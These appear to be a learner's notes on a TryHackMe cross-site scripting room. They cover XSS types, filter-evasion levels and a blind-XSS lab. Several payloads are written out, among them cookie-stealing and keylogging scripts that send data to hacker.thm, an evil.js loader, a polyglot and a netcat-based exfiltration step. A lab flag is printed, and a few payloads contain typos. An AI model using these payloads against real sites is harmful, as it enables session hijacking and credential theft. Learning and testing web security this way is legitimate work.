#xss #webhacking #webapplicationpentesting #bugbounty #tryhackme 

# Room Brief

**Prerequisites:**  
It's worth noting that because XSS is based on JavaScript, it would be helpful to have a basic understanding of the language. However, none of the examples is overly complicated—also, a basic understanding of Client-Server requests and responses.

Cross-Site Scripting, better known as XSS in the cybersecurity community, is classified as an injection attack where malicious JavaScript gets injected into a web application with the intention of being executed by other users. In this room, you'll learn about the different XSS types, how to create XSS payloads, how to modify your payloads to evade filters, and then end with a practical lab where you can try out your new skills.

Cross-site scripting vulnerabilities are extremely common. Below are a few reports of XSS found in massive applications; you can get paid very well for finding and reporting these vulnerabilities.  

- [XSS found in Shopify](https://hackerone.com/reports/415484)
- [$7,500 for XSS found in Steam chat](https://hackerone.com/reports/409850)
- [$2,500 for XSS in HackerOne](https://hackerone.com/reports/449351)
- [XSS found in Infogram](https://hackerone.com/reports/283825)
# XSS Payloads
## What is a Payload?

In XSS, the payload is the JavaScript Code we wish to be executed on the target's computer. There are two parts to the payload, the intention and the modification.

- The **intention** is what you wish for the JavaScript to actually do (which we will cover with some examples below), 
- The **modification** is the changes to the code we need to make to make it execute as every scenario is different

Here are some examples of XSS Intentions:
### Proof of Concept

This is the simplest of payloads where all you want to do is demonstrate that you can achieve XSS on a website. This is often done by causing an alert box to pop up on the page with a string of text, for example:

```html
<script>alert('XSS');</script>
```
### Session Stealing

Details of a user's session, such as login tokens, are often kept in cookies on the target's machine. The below JavaScript takes the target's cookie, base64 encodes the cookie to ensure successful transmission and then posts it to a website under the hacker's control to be logged. Once the hacker has these cookies, they can take over the target's session and be logged as that user.

```html
<script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script>
```
### Key Logger

The below code acts as a key logger. This means anything you type on the webpage will be forwarded to a website under the hacker's control. This could be very damaging if the website the payload is installed on accepted user logins or credit card details.

```html
<script>document.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key) );}</script>
```
### Business Logic

This payload is a lot more specific than the above examples. This woeuld be about calling a particular network resource or a JavaScript function. For example, imagine a JavaScript function for changing the user's email address called `user.changeEmail()`. Your payload could look like this:

```html
<script>user.changeEmail('attacker@hacker.thm');</script>
```

Now that the email address for the account has changed, the attacker may perform a reset password attack.

The next four tasks are going to cover the different types of XSS vulnerabilities, all requiring slightly different attack payloads and user interaction.
# Reflected XSS

Reflected XSS happens when user-supplied data in an HTTP request is included in the webpage source without and validation.
## Example Scenario:

A website where you enter incorrect input, an error message is displayed. The content of the error message gets taken away from the **error** parameter in the query string and is built directly into the page source. 

```URL
https://website.thm/?error=Invalid Input Detected
```
```html
<div class="alert alert-danger">
	<p>Invalid Input Detected</p>
</div>
```

The application doesn't check the contents of the error parameter, which allows the attacker to insert malicious code.

```URL
https://website.thm/?error=<script src="https://attacker.thm/evil.js"></script>
```
```html
<div class="alert alert-danger">
	<p><script src="https://attacker.thm/evil.js"></script></p>
</div>
```

The vulnerability can be used as per the scenario in the image below:

![](https://i.imgur.com/S2kJUya.png)
## Potential Impact

The attacker could send links or embed them into an iFrame on another website containing a JavaScript payload to potential victims getting them to execute code on their browser, potentially revealing session or customer information.
## How to Test for Reflected XSS

You'll need to test every possible point of entry; these include:

- Parameters in the URL Query String
- URL File Path
- Sometimes HTTP Headers (although unlikely exploitable in practice)

Once you've found some data which is being reflected in the web application, you'll then need to confirm that you can successfully run your JavaScript payload; your payload will be dependent on where in the application your code is reflected (you'll learn more about this in task 6).
# Stored XSS

As the name infers, the XSS payload is stored on the web application (in a database, for example) and then gets run when other users visit the site or web page.
## Example Scenario

A blog website that allows user to post comments. Unfortunately, these comments aren't checked for whether they contain JavaScript or filter our any malicious code. If we now post a comment containing JavaScript, this will be stored in the database, and every other user now visiting the article will have the JavaScript run in their browser.

![](https://i.imgur.com/l2QRvfO.png)
## Potential Impact

The malicious JavaScript could redirect users to another site, steal the user's session cookie, or perform other website actions while acting as the visiting user.
## How to Test for Stored XSS

You'll need to test for every possible point of entry where it seems data is stored and then shown back in areas that other users have access to; a small example of these could be:

- Comments on a blog
- User profile information
- Website Listings

Sometimes developers think limiting input values on the client-side is good enough protection, so changing values to something the web application wouldn't be expecting is a good source of discovering stored XSS, for example, an age field that is expecting an integer from a dropdown menu, but instead, you manually send the request rather than using the form allowing you to try malicious payloads.

Once you've found some data which is being stored in the web application, you'll then need to confirm that you can successfully run your JavaScript payload; your payload will be dependent on where in the application your code is reflected (you'll learn more about this in Task 6).
# DOM-Based XSS
## What is the DOM?

DOM stands for **Document Object Model** and is a programming interface for HTML and XML documents. It represents the page so that programs can change the document structure, style and content. A web page is a document, and this document can be either displayed in the browser window or as the HTML source. A diagram of the HTML DOM is displayed below:

![](https://i.imgur.com/3pZw0BJ.png)

If you want to learn more about the DOM and gain a deeper understanding, [w3.org](https://www.w3.org/TR/REC-DOM-Level-1/introduction.html) have a great resource.
## Exploiting the DOM

DOM Based XSS is where the JavaScript execution happens directly in the browser without any new pages being loaded or data submitted to backend code. Execution occurs when the the website JavaScript code acts on input or user interaction.
## Example Scenario:

The website's JavaScript gets the contents from `window.location.hash` parameter and then writes that onto the page in the currently being viewed section. The contents of the hash aren't checked for malicious code, allowing an attacker to inject JavaScript of their choosing onto the webpage. 
## Potential Impact

Crafted links could be sent to potential victims, redirecting them to another website or steal content from the page or the user's session. 
## How to Test for DOM-Based XSS

DOM Based XSS can be challenging to test for and requires a certain amount of knowledge of JavaScript to read the source code. You'd need to look for parts of the code that access certain variables that an attacker can have control over, such as "`window.location.x`" parameters.

When you've found those bits of code, you'd then need to see how they are handled and whether the values are ever written to the web page's DOM or passed to unsafe JavaScript methods such as **eval()**.
# Blind XSS

Blind XSS is similar to a stored XSS in that your payload gets stored on the website for another user to view, but in this instance, you can't see the payload working or be able to test it against yourself first.
## Example Scenario

A website has a contact form where you can message a member of staff. The message content doesn't get checked for any malicious code, which allows the attacker to enter anything they wish. These messages then get turned into support tickets which staff view on a private web portal.
## Potential Impact

Using the correct payload, the attacker's JavaScript could make calls back to an attacker's website, revealing  the staff portal URL, the staff member's cookies, and even the contents of the portal page that is being viewed. Now the attacker could potentially hijack the staff member's session and have access to the private portal.
## How to Test for Blind XSS

When testing for Blind XSS vulnerabilities, you need to ensure your payload has a call back (usually an HTTP request). This way you know if and when your code is being executed. A popular tool for Blind XSS is [XSS Hunter Express](https://github.com/mandatoryprogrammer/xsshunter-express). Although it's possible to make your own tool in JavaScript, this tool will automatically capture cookies, URLs, page contents and more.
# Perfecting your Payload

The payload is the JavaScript code we want to execute either on another user's browser or as proof of concept to demonstrate a vulnerability in a website. 

Your payload could have many intentions, from just bringing up a JavaScript alert box to prove we can execute JavaScript on the target website to extracting information from the webpage or user's session.

How your JavaScript payload gets reflected in a target website's code will determine the payload you need to use. To explain this, click the green Start Machine button and when the machine is loaded, open the below link in a new tab. 

[https://10-10-9-224.p.thmlabs.com](https://10-10-9-224.p.thmlabs.com)

The aim for each level will be to execute the JavaScript alert function with the string THM, for example:

```html
<script>alert('THM');</script>
```
## Level One

You're presented with a form asking you to enter your name, and once you've entered your name, it will be presented on a line below, for example:

If you view the page source after entering your name, you'll see the name reflected in the code:

```html
<div class="text-center">
	<h2>Hello, Adam</h2>
</div>
```

Instead of entering your name, we're instead going to try entering the following JavaScript Payload: `<script>alert('THM');</script>`

Now when you click the enter button, you'll get an alert popup with the string HTM and the page source will look like the following:

```html
<div class="text-center">
	<h2>Hello, <script>alert('THM');</script></h2>
</div>
```

And then, you'll get a confirmation message that your payload was successful with a link to the next level.
## Level Two

Like the previous level, you're being asked again to enter your name. This time when clicking enter, your name is being reflected in an input tag instead:

Viewing the page source, we can see our name reflected inside the value attribute of the input tag:

```html
<div class="text-center">
	<h2>Hello, <input value="Jason"></h2>
</div>
```

It wouldn't work if we were to try the previous JavaScript payload because you can't run it from inside the input tag. Instead, we need to escape the input tag first so the payload can run properly. You can do this with the following payload:

```html
><script>alert('THM');</script>
```

The important part of the payload is the `">` which closes the value parameter and then closes the input tag. 

This now properly closes the input tag and allows the JavaScript payload to run:

```html
<div class="text-center">
	<h2>Hello, <input value=""><script>alert('THM');</script></h2>
</div>
```

Now when you click the enter button, you'll get an alert popup with the string THM. And then, you'll get a confirmation message that your payload was successful with a link to the next level. 
## Level Three

You're presented with another form asking for your name, and the same as the previous level, your name gets reflected inside an HTML tag, this time the `textarea` tag.

We'll have to escape the textarea tag a little differently from the input one (in Level Two) by using the following payload: `</textarea><script>alert('THM');</script>`

The input above turns this:
```html
<div class="text-center">
	<h2>Hello, <textarea>Jason</textarea></h2>
</div>
```

Into this:
```html
<div>
	<h2>Hello, <textarea></textarea><script>alert('THM');</script></textarea></h2>
</div>
```

The important part of the above payload is the `</textarea>`, which causes the textarea element to close so the script will run. 

Now when you click the enter button, you'll get an alert popup with the string THM. And then, you'll get a confirmation message that your payload was successul with a link to the next level. 
## Level Four

Entering your name into the form, you'll see it reflected on the page. This level looks similar to level one, but upon inspecting the page source, you'll see your name gets reflected in some JavaScript code.

```html
<script>
	document.getElementsByClassName('name')[0].innerHTML='Adam';
</script>
```

We will have to escape the existing JavaScript command, so we're able to run our code; we can do this with the following payload `'alert('THM');//` which we'll see from the below screenshot will execute our code. The `'` closes the field specifying the name, then `;` signifies the end of the current command, and the `//` at the end makes anything after it a comment rather than executable code.

```html
<script>
	document.getElementsByClassName('name')[0].innerHTML='';alert('THM');//';
</script>
```

Now when we click the enter button, we will get an alert popup with the string THM. And then, we'll get a confirmation message that our payload was successful with a link to the next level.
## Level Five

Now, this level looks that same as the old one, and our name also gets reflected in the same place. But if we try the `<script>alert('THM');</script>` payload, it won't work. When we view the page source, we see why.

```html
<div class="text-center">
	<h2>Hello, <>alert('THM');</></h2>
</div>
```

The word `script` gets removed from out payload, because there is a filter that strips out any potentially dangerous words.

When a word gets removed from a string, there's a helpful trick that you can try. 

```
<sscriptscript>alert('THM');</sscriptcript>
```

Final payload after passing the filter:

```
<script>alert('THM')'</script>
```

Try entering the payload `<sscriptcript>alert('THM');</sscriptcript>` and click the enter button, you'll get an alert popup with the string THM. And then, you'll get a confirmation message that your payload was successful with a link to the next level.
## Level Six

Similar to level two, where we had to escape from the value attribute of an input string, we can try `"><script>alert('THM');</script>`, but that doesn't seem to work. Let's inspect the page source to see why that doesn't work.

```html
<div class="text-center">
	<h2>Your Picture</h2>
	<img src=""scriptalert('THM');/script">
</div>
```

We can see that the `<` and `>` characters get filtered out from our payload, preventing us from escaping the IMG tag. To get around the filter, we can take advantage of the additional attributes of the IMG tag, such as the onload event. 

The onload event executes the code of our choosing once the image specified in the src attribute has loaded onto the web page. 

Let's change our payload to reflect this `/images/cat.jpg" onload="alert('THM');` and then viewing the page source, and we will see how this will work.

```html
<div class="text-center">
	<h2>Your Picture</h2>
	<img src="/images/cat.jpg" onload="alert('THM');">
</div>
```

Now when we click the enter button, we get an alert popup with the string THM. And then, we will get a confirmation message that our payload was successful; with this being the last level, we receive a flag. **THM{XSS_MASTER}** 
## Polyglots

An XSS Polyglot is a string of text which can escape attributes, tags and bypass filters all in one. You can have used the below polyglot on all six levels that we just completed, and it would have executed the code successfully.

```jS
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('THM')//>\x3e
```
# Practical Example (Blind XSS)

Click on the **Customers** tab on the top navigation bar and click the "**Signup here**" link to create an account. Once your account gets set up, click the **Support Tickets** tab, which is the feature we will investigate for weaknesses. 

Try creating a support ticket by clicking the green Create Ticket button, enter the subject and content of just the word test and then click the blue Create Ticket button. You'll now notice your new ticket in the list with an id number which you can click to take you to your newly created ticket. 

Like task three, we will investigate how the previously entered text gets reflected on the page. Upon viewing the page source, we can see the text gets placed inside a textarea tag.

```html
    <div><label>Ticket Contents:</label></div>
    <div><textarea class="form-control">text</textarea></div>
  </div>
</div>
```

Let's now go back and create another ticket. Let's see if we can escape the textarea tag by entering the following payload into the ticket contents:

```html
</textarea>test
```

Again, opening the ticket and viewing the page source, we've successfully escaped the text area tag.

```html
    <div><label>Ticket Created:</label> 23/08/2021 12:24</div>
    <div><label>Ticket Contents:</label></div>
    <div><textarea class="form-control"></textarea>test</textarea></div>
  </div>
</div>
```

Let's now expand on this payload to see if we can run JavaScript and confirm that the ticket creation feature is vulnerable to an XSS attack. Try another new ticket with the following payload:

```html
</textarea><script>alert('THM'):</script>
```

Now when we view the ticket, we should get an alert box with the string THM. We're going to now expand the payload even further and increase the vulnerabilities impact. Because this feature is creating a support ticket, we can be reasonably confident that a staff member will also view this ticket which we could get to execute JavaScript.

> Some helpful information to extract from another user would be their **cookies**, which we could use to elevate our privileges by hijacking their login session. To do this, our payload will need to extract the user's cookie and exfiltrate it to another webserver of our choice. Firstly, we'll need to set up a listening server to receive the information. 

Using the AttackBox, let's set up a listening server using `Netcat`. If we want to listen on port 9001, we issue the command `nc -l -p 9001`. The `-l` option indicates that we want to use Netcat in listening mode, while the `-p` option is used to specify the port number. To avoid the resolution of hostnames via DNS, we can add `-n`; moreover, to discover any errors, running Netcat in verbose mode by adding the `-v` option is recommended. The final command becomes `nc -n -l -v -p 9001`, equivalent to `nc -nlvp 9001`.

```
user@machine$ nc -nlvp 9001 Listening on [0.0.0.0] (family 0, port 9001)`
```

Now that we've set up the method of receiving the exfiltrated content, let's build the payload.

```html
</textarea><script>fetch('http://URL_OR_IP:PORT_NUMBER?cookie=' + btoa(document.cookie) );</script>
```

Let's break this payload down:

- The `</textarea>` tag closes the text field area.
- The `<script>` tag opens an area for us to write JavaScript.
- The `fetch()` command makes an HTTP request.
- `URL_OR_IP` is either the THM request catcher url, your IP address from the THM AttackBox, or your IP Address on the THM VPN network.
- `PORT_NUMBER` is the port number you are using to listen to connections on the AttackBox.
- `?cookie=` is the query string containing the victim's cookies.
- `btoa()` command base64 encodes the victim's cookies.
- `document.cookie` accesses the victim's cookies for the Acme IT Support website.
- `</script>` closes the JavaScript code block.

Now create another ticket using the above payload, making sure to swap out the `URL_OR_IP:PORT_NUMBER` variables with your settings (make sure to specify the port number as well for the Netcat listener). Now, wait up to a minute, and you will see the request come through containing the victim's cookies. 

You can now base64 decode this information using a site like [https://www.base64decode.org/](https://www.base64decode.org/), giving you the necessary information to answer the below question.

